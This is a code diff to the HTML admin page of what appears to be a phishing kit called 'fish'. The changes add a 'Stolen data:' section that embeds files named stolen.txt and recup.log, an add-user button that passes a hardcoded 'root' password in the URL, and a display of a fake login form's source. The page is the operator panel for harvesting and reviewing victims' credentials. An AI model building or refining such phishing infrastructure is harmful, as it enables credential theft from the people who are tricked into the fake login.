@@ -33,6 +33,8 @@
 <html>
 	<head>
 		<title>Admin - fish</title>
+		<link rel="icon" href="https://avatars1.githubusercontent.com/u/19672114?v=3&s=460">
+		<meta http-equiv="refresh" content="30">
 	</head>
 	<body>
 		<h1>Admin page for fish</h1>
@@ -66,15 +68,17 @@
 		</div>
 		<div class="div_class" id="add_new_user_div">
 			<h2 class="h2_class" id="add_new_user_header_id">add new user:</h2>
-			<input type="submit" value="click to add a user" onclick="var user = prompt('user ip:'); document.location.href='../fish_logic/add_new_user.php?psw=root&user='+user">
+			<input class="button_class" id="button_add_user" type="submit" value="click to add a user" onclick="var user = prompt('user ip:'); if(user != null) { document.location.href='../fish_logic/add_new_user.php?psw=root&user='+user } ">
 		</div>
-	<hr />
 		<div class="div_class" id="stolen_txt_div">
+			<h2 class="h2_class" id="stolen_data_header">Stolen data:</h2>
 			<embed class="iframe_class" id="stolen_txt_iframe" src="../data/stolen.txt" />
+			<a href="../data/stolen.txt"><h3 class="h3_class" id="reload_header1">Reload page</h3></a>
 			<embed class="iframe_class" id="recup_log_iframe" src="../data/recup.log" />
+			<a href="../data/recup.log"><h3 class="h3_class" id="reload_header2">Reload page</h3></a>
 		</div>
-	<hr />
 		<div class="div_class" id="code_div">
+			<h2 class="h2_class" id="source_code_header">Source code:</h2>
 			<code class="code_class" id="sample_html_code">
 				&ltform action="login.php" method="POST"><br />
 &nbsp				&ltlabel>Nom d'utilisateur:&lt/label>&ltbr /><br />
